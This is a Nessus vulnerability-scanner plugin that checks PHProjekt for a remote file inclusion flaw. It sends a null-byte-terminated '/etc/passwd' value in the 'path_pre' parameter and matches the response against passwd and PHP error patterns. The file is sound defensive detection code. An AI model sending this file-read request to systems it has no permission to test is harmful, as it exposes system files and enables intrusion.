#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(21189);
  script_version("1.21");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2004-2740");
  script_bugtraq_id(12116);

  script_name(english:"PHProjekt authform.inc.php path_pre Parameter Remote File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to
remote file include attacks.");
  script_set_attribute(attribute:"description", value:
"The remote host is running PHProjekt, an open source groupware suite
written in PHP. 

The version of PHProjekt installed on the remote host fails to
sanitize user-supplied input to the 'path_pre' parameter of the
'lib/authform.inc.php' script before using it in a PHP
'include_once()' function.  Provided PHP's 'register_globals' setting
is enabled, an unauthenticated attacker may be able to exploit this
issue to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts.");
  script_set_attribute(attribute:"see_also", value:"https://security.gentoo.org/glsa/200412-27");
  script_set_attribute(attribute:"solution", value:
"Upgrade to PHProject version 4.2.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_cwe_id(94);

  script_set_attribute(attribute:"vuln_publication_date", value:"2004/12/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/04/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:phprojekt:phprojekt");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/phprojekt", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit one of the flaws to read a file.
  file = "/etc/passwd%00";
  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/lib/authform.inc.php?",
      "path_pre=", file ));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but an attacker with
    #     local access and/or remote file inclusion might still work.
    egrep(pattern:"main\(/etc/passwd\\0lib/lib\.inc\.php.+ failed to open stream", string:res) ||
    egrep(pattern:"Failed opening '/etc/passwd\\0lib/lib\.inc\.php'", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction or...
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<br />");

    if (isnull(contents)) security_warning(port);
    else
    {
      contents = data_protection::redact_etc_passwd(output:contents);
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }

    exit(0);
  }
}
